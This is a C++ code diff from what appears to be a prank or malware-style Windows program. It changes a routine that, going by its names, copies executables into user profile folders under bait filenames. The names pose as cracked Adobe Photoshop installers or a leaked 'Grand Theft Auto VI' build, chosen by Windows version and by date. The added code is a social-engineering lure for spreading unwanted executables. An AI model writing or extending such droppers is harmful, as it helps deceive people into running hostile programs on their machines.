@@ -122,15 +122,52 @@ static void DropCatVid()
 
 static void Cracklol01()
 {
-    // TODO: pick a per-OS crack filename (XP-era CS4 name vs a
-    // newer Adobe crack name on modern Windows).
-    CopyToProfiles(
-        L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe",
-        L"uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack"
-        /*L"Grand Theft Auto VI CYBERLEEK-buildv.1.0.245\\Grand Theft Auto VI CYBERLEEK-buildv.1.0.245.iso.exe" // todo: would be cool if this were the
-                                                                                                          */    // default filename if the demo if being
-                                                                                                              // executed AFTER 01/01/2027
-    );
+    // Per-OS crack name: XP-era CS4, Win7+ CC 2024, GTA VI after
+    // 01/01/2027. GetVersionExW is deprecated but XP-compatible;
+    // we don't carry a manifest, so it returns the real version.
+    OSVERSIONINFOEXW osvi{};
+    osvi.dwOSVersionInfoSize = sizeof(osvi);
+    if (!GetVersionExW(reinterpret_cast<OSVERSIONINFOW*>(&osvi)))
+        ZeroMemory(&osvi, sizeof(osvi));
+
+    SYSTEMTIME now;
+    GetLocalTime(&now);
+
+    const bool afterGTA =
+        (now.wYear > 2027) ||
+        (now.wYear == 2027 && now.wMonth > 1) ||
+        (now.wYear == 2027 && now.wMonth == 1 && now.wDay >= 1);
+
+    const bool modern =
+        (osvi.dwMajorVersion > 6) ||
+        (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion >= 1);
+
+    const wchar_t* targetName = nullptr;
+    const wchar_t* subDir = nullptr;
+
+    if (afterGTA)
+    {
+        targetName =
+            L"Grand Theft Auto VI CYBERLEEK-buildv.1.0.245"
+            L"\\Grand Theft Auto VI CYBERLEEK-buildv.1.0.245.iso.exe";
+        subDir = nullptr;
+    }
+    else if (modern)
+    {
+        targetName =
+            L"Adobe.Photoshop.CC.2024.v25.0.0.0_64bit_crack.exe";
+        subDir =
+            L"uTorrent\\Adobe.Photoshop.CC.2024\\Setup+Crack";
+    }
+    else
+    {
+        targetName =
+            L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe";
+        subDir =
+            L"uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack";
+    }
+
+    CopyToProfiles(targetName, subDir);
 }
 
 // ============================================================
